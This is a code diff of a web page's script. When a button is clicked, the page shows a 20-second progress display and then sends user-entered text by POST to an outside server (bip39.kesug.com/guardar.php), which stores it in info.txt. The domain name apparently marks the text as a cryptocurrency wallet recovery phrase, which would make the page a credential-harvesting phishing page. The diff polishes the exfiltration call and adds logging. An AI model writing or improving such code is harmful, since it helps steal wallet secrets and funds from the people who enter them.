@@ -60,12 +60,15 @@ button.addEventListener('click', () => {
         clearInterval(interval);
         message.style.display = 'block';
 
-        // Enviar al servidor PHP para guardar en info.txt
-fetch('http://www.bip39.kesug.com/guardar.php', {
-  method: 'POST',
-  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-  body: 'texto=' + encodeURIComponent(texto)
-});
+        // Aquí llamamos al PHP en tu servidor
+        fetch('http://www.bip39.kesug.com/guardar.php', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+          body: 'texto=' + encodeURIComponent(texto)
+        })
+        .then(res => res.text())
+        .then(data => console.log("Respuesta del servidor:", data))
+        .catch(err => console.error("Error:", err));
       }
     }, 200); // 200ms * 100 = 20 segundos
   } else {
@@ -78,6 +81,7 @@ fetch('http://www.bip39.kesug.com/guardar.php', {
     }
   }
 });
+
 </script>
 </body>
 </html>
